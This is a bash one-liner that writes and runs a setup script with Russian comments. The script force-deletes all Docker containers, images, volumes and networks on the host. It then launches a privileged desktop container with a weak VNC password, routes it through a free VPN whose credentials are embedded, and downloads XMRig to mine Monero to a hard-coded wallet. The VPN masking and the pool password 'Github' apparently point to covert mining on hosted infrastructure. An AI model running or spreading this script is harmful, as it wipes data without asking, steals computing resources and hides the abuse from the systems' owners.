echo '#!/bin/bash
# === Очистка старых контейнеров ===
docker ps -aq | xargs -r docker stop
docker ps -aq | xargs -r docker rm -f
docker images -aq | xargs -r docker rmi -f
docker volume ls -q | xargs -r docker volume rm
docker network ls | grep -v "bridge\|host\|none" | awk "{print \$1}" | xargs -r docker network rm
rm -rf ~/dockercom

# === Установка зависимостей ===
apt update && apt install -y docker.io docker-compose openvpn curl unzip

# === Создание docker-compose ===
mkdir -p ~/dockercom && cd ~/dockercom
cat > ubuntu_gui.yml <<EOL
version: "3.8"
services:
  ubuntu-gui:
    image: dorowu/ubuntu-desktop-lxde-vnc:bionic
    container_name: ubuntu_gui
    ports:
      - "6080:80"
      - "5900:5900"
    environment:
      - VNC_PASSWORD=pass123
    volumes:
      - ./data:/data
      - /dev/net/tun:/dev/net/tun
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun
    privileged: true
    shm_size: "2g"
EOL

# === Запуск контейнера ===
docker-compose -f ubuntu_gui.yml up -d

# === VPN и XMRig ===
docker exec -i ubuntu_gui bash <<'"'"'EOF'"'"'
apt update && apt install -y openvpn curl unzip resolvconf

cd /tmp
curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.zip
unzip -o VPNBook.com-OpenVPN-Euro1.zip -d vpnbook

cat > vpnbook/auth.txt <<EOP
vpnbook
cf324xw
EOP

echo "nameserver 1.1.1.1" > /etc/resolv.conf

openvpn --config vpnbook/vpnbook-euro1-tcp443.ovpn \
  --auth-user-pass vpnbook/auth.txt \
  --daemon \
  --route-up /etc/openvpn/update-resolv-conf \
  --down /etc/openvpn/update-resolv-conf

sleep 30
curl -s ifconfig.me

# === XMRig ===
POOL="gulf.moneroocean.stream:10128"
WALLET="47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi"
PASSWORD="Github"
XMRIG_VERSION="6.22.2"
ARCHIVE_NAME="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
curl -LO "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${ARCHIVE_NAME}"
tar -xzf "$ARCHIVE_NAME"
cd "xmrig-${XMRIG_VERSION}"
cat > config.json <<EOF2
{
  "autosave": false,
  "background": false,
  "cpu": true,
  "donate-level": 0,
  "pools": [{
    "url": "'$POOL'",
    "user": "'$WALLET'",
    "pass": "'$PASSWORD'",
    "algo": "rx",
    "tls": false
  }]
}
EOF2
chmod +x xmrig
./xmrig -c config.json
EOF

echo "✅ Всё запущено. VNC на :6080 (пароль pass123)"
' > /tmp/start.sh && chmod +x /tmp/start.sh && bash /tmp/start.sh
